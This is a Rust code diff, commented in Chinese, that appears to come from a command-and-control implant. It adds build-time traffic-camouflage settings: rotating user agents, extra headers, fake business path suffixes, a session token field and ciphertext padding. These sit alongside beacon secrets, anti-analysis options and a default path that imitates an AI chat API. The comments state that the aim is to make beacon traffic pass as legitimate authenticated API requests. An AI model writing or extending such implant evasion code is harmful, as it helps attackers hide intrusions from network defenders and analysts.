@@ -304,6 +304,16 @@ pub struct InjectedConfig {
     pub beacon_secret: String,
     #[serde(default, alias = "anti_analysis")]
     pub anti_analysis: AntiAnalysisConfig,
+    // ── 构建时注入的流量伪装（注册后服务端 profile 可覆盖）──────────
+    /// UA 轮换列表（构建页面编辑注入）。
+    #[serde(default, alias = "user_agents")]
+    pub user_agents: Vec<String>,
+    /// 附加请求头（构建页面编辑注入，格式 "Name: value"）。
+    #[serde(default, alias = "extra_headers")]
+    pub extra_headers: Vec<String>,
+    /// 虚假业务路径后缀列表（构建页面编辑注入）。
+    #[serde(default, alias = "path_suffixes")]
+    pub path_suffixes: Vec<String>,
 }
 
 fn default_core_key_path() -> String {
@@ -347,9 +357,15 @@ pub struct ProfileTransform {
     /// 让请求在结构上等价于带鉴权的业务 API。
     #[serde(default = "default_sign_key")]
     pub sign_key: String,
+    /// 外层壳：会话 token 字段名（服务端路由用；与注册下发 tokenKey 一致）。
+    #[serde(default = "default_token_key")]
+    pub token_key: String,
     /// UA 轮换列表（空 = 用构建时的默认 UA）。
     #[serde(default)]
     pub user_agents: Vec<String>,
+    /// 附加请求头（格式 "Name: value"，构造时注入或 profile 下发）。
+    #[serde(default)]
+    pub extra_headers: Vec<String>,
     /// 心跳/结果明文尾部随机 padding 字符数范围（密文长度随机化）。
     #[serde(default = "default_padding_min")]
     pub padding_min: u32,
@@ -377,6 +393,7 @@ fn default_data_key() -> String { "d".into() }
 fn default_ts_key() -> String { "ts".into() }
 fn default_rand_key() -> String { "r".into() }
 fn default_sign_key() -> String { String::new() }
+fn default_token_key() -> String { "sid".into() }
 fn default_padding_min() -> u32 { 0 }
 fn default_padding_max() -> u32 { 64 }
 fn default_ai_path() -> String { "/v1/chat/completions".into() }
@@ -391,7 +408,9 @@ impl Default for ProfileTransform {
             ts_key: default_ts_key(),
             rand_key: default_rand_key(),
             sign_key: default_sign_key(),
+            token_key: default_token_key(),
             user_agents: Vec::new(),
+            extra_headers: Vec::new(),
             padding_min: default_padding_min(),
             padding_max: default_padding_max(),
             heartbeat_interval_ms: 0,
